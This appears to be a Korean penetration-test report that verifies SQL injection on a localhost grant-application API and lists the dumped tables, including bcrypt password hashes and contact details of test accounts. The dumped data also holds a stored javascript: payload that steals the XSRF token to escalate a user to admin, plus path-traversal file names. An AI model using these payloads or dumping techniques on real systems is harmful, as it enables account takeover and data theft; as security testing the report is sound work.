# SQL Injection 검증 보고서

- Target: `http://localhost:8080/api/monitoring/admin`

## 테스트 결과

#### 확인된 반환값



### Table: `application_documents`


| application_document_id | created_at | updated_at | deleted_at | doc_type | file_size | origin_file_name | store_file_name | application_id | user_id |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | 2026-08-26 12:18:16.825356 | 2026-08-26 12:18:16.825356 |  | RESIDENT_REGISTRATION_COPY | 9 | test.txt | test.txt | 1 | 3 |
| 2 | 2026-08-26 12:18:16.830355 | 2026-08-26 12:18:16.830355 |  | FAMILY_RELATION_CERTIFICATE | 9 | test.txt | test.txt | 1 | 3 |
| 3 | 2026-08-26 12:18:16.831356 | 2026-08-26 12:18:16.831356 |  | INCOME_VERIFICATION_DOCUMENT | 9 | test.txt | test.txt | 1 | 3 |


### Table: `grants`


| grant_id | created_at | updated_at | deleted_at | amount | category | content | cycle | end_date | start_date | status | title |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | 2026-08-26 12:17:55.867000 | 2026-08-26 12:17:55.867000 |  | 20 | YOUTH_EMPLOYMENT | 청년 월세 특별지원은 무주택 청년에게 연 최대 240만 원(월 20만 원)의 임차료를 지원합니다. | MONTHLY | 2026-09-26 00:00:00.000000 | 2026-08-26 00:00:00.000000 | RECRUITING | 청년 월세 특별지원 |


### Table: `notices`


| notice_id | created_at | updated_at | deleted_at | content | is_pinned | title |
| --- | --- | --- | --- | --- | --- | --- |


### Table: `request_logs`


| log_id | api_url | created_at | request_id | request_time |
| --- | --- | --- | --- | --- |
| 58 | /api/user/logout | 2026-08-27 01:41:23.296709 | 1614ca56-b83c-411c-b9af-d5d801acef12 | 2026-08-27 01:41:23.288000 |
| 59 | /api/user/login/public | 2026-08-27 01:49:04.815433 | b8051fe5-4c57-4c6e-a970-6b37bc0fd145 | 2026-08-27 01:49:04.776000 |


### Table: `user_applications`


| application_id | created_at | updated_at | deleted_at | active_flag | status | grant_id | user_id |
| --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | 2026-08-26 12:18:16.820355 | 2026-08-26 12:18:16.820355 |  | 0 | SUBMITTED | 1 | 3 |


### Table: `user_documents`


| document_id | created_at | updated_at | deleted_at | doc_type | file_size | origin_file_name | store_file_name | user_id |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | 2026-08-26 06:44:48.732750 | 2026-08-26 06:44:48.732750 |  | RESIDENT_REGISTRATION_COPY | 9 | ../DEVNOTES.md | ../DEVNOTES.md | 2 |
| 2 | 2026-08-26 07:25:46.500331 | 2026-08-26 07:25:46.500331 |  | RESIDENT_REGISTRATION_COPY | 9 | DEVNOTES.md | DEVNOTES.md | 2 |
| 3 | 2026-08-26 08:36:17.787947 | 2026-08-26 08:36:17.787947 |  | RESIDENT_REGISTRATION_COPY | 9 | ../DEVNOTES.md | ../DEVNOTES.md | 2 |
| 4 | 2026-08-26 12:15:40.916711 | 2026-08-26 12:15:40.916711 |  | RESIDENT_REGISTRATION_COPY | 9 | test.txt | test.txt | 3 |
| 5 | 2026-08-26 12:15:49.682351 | 2026-08-26 12:15:49.682351 |  | FAMILY_RELATION_CERTIFICATE | 9 | test.txt | test.txt | 3 |
| 6 | 2026-08-26 12:15:58.012413 | 2026-08-26 12:15:58.012413 |  | INCOME_VERIFICATION_DOCUMENT | 9 | test.txt | test.txt | 3 |


### Table: `user_favorites`


| favorite_id | created_at | updated_at | deleted_at | active_flag | grant_id | user_id |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | 2026-08-26 12:18:07.436747 | 2026-08-26 12:18:07.436747 |  | 0 | 1 | 3 |


### Table: `user_inquiries`


| inquiry_id | created_at | updated_at | deleted_at | answer | answered_at | content | link | status | title | user_id |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | 2026-08-26 11:43:31.721727 | 2026-08-26 11:43:31.721727 |  |  |  | 테스트용 문의입니다. | javascript:(async()=>{ const c=document.cookie.split('; ').find(x=>x.startsWith('XSRF-TOKEN=')); const t=c?.split('=').slice(1).join('='); await fetch('/api/user/role/2/admin', {method:'PATCH',credentials:'include',headers:{'Content-Type': 'application/json', 'X-Request-Id': crypto.randomUUID(), 'X-Request-Time': new Date().toISOString(), 'XSRF-TOKEN':decodeURIComponent(t)},body:JSON.stringify({'role':'ADMIN'})})})() | PENDING | 일반계정 권한 상승 취약점 테스트 | 2 |


### Table: `users`


| user_id | created_at | updated_at | deleted_at | account_num | bank_name | email | name | password | phone | role | username |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 1 | 2026-08-26 06:39:17.584088 | 2026-08-26 06:39:17.584088 |  |  |  | 124567@naver.com | 관리자 | {bcrypt}$2a$10$4Xo1g3hlsH.g8Od.2abMfOn1vVI5O/V51g5BB/TccqgoHMGeJM2US | 010-1234-5678 | ADMIN | admin |
| 2 | 2026-08-26 06:39:54.117665 | 2026-08-26 11:46:06.256498 |  |  |  | Admin@google.com | tester | {bcrypt}$2a$10$5s36j2Zi0RbxQUzggK2n3ObG5HoynG4kgXA8lRSLfzZeAfstZ2rqS | 01012345678 | ADMIN | test |
| 3 | 2026-08-26 12:15:22.350454 | 2026-08-26 12:15:22.350454 |  |  |  | tester@naver.com | 테스트계정 | {bcrypt}$2a$10$vSBIp.mrN2cMYx58BL.4CuS4C/Nxx4tAbz2kgQfVvuI/B1N/AQxYm | 010-1234-5678 | USER | test2 |